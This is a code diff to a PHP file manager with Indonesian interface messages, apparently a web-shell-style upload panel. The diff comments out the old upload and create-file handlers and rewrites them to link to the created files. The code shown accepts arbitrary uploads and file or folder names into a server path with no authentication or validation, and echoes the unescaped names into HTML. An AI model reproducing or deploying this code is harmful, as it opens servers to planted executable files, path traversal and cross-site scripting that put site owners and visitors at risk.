@@ -108,25 +108,52 @@ $search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
 $msg = "";
 $msgType = "";
 
+// if(isset($_FILES['file'])){
+//     $dest = $path.'/'.$_FILES['file']['name'];
+//     if(copy($_FILES['file']['tmp_name'],$dest)){
+//         $msg = "Upload Berhasil: ".$_FILES['file']['name'];
+//         $msgType = "success";
+//     } else {
+//         $msg = "Upload Gagal!";
+//         $msgType = "error";
+//     }
+// }
 if(isset($_FILES['file'])){
     $dest = $path.'/'.$_FILES['file']['name'];
     if(copy($_FILES['file']['tmp_name'],$dest)){
-        $msg = "Upload Berhasil: ".$_FILES['file']['name'];
+        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dest);
+        $fileUrl = $relativePath;
+        $msg = "Upload Berhasil: <a href='".$fileUrl."' target='_blank'>".$_FILES['file']['name']."</a>";
         $msgType = "success";
     } else {
         $msg = "Upload Gagal!";
         $msgType = "error";
     }
 }
-if(isset($_POST['newfile'])){
-    if(file_put_contents($path.'/'.$_POST['newfile'],"")){
-        $msg = "File dibuat: ".$_POST['newfile'];
+
+// if(isset($_POST['newfile'])){
+//     if(file_put_contents($path.'/'.$_POST['newfile'],"")){
+//         $msg = "File dibuat: ".$_POST['newfile'];
+//         $msgType = "success";
+//     } else {
+//         $msg = "Gagal membuat file!";
+//         $msgType = "error";
+//     }
+// }
+if(isset($_POST["newfile"])){
+    $newFile = $path.'/'.$_POST["newfile"];
+    $result = file_put_contents($newFile,"");
+    if($result !== false){
+        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFile);
+        $fileUrl = $relativePath;
+        $msg = "File dibuat: <a href='".$fileUrl."' target='_blank'>".$_POST["newfile"]."</a>";
         $msgType = "success";
     } else {
         $msg = "Gagal membuat file!";
         $msgType = "error";
     }
 }
+
 if(isset($_POST['newfolder'])){
     if(mkdir($path.'/'.$_POST['newfolder'])){
         $msg = "Folder dibuat: ".$_POST['newfolder'];
@@ -499,7 +526,7 @@ foreach($paths as $id=>$pat){
 </div>
 
 <?php if($msg): ?>
-<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=='success'?'check':'exclamation'?>-circle"></i> <?=$msg?></div>
+<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="success"?'check':'exclamation'?>-circle"></i> <?php echo $msg; ?></div>
 <?php endif; ?>
 
 <!-- File Manager -->
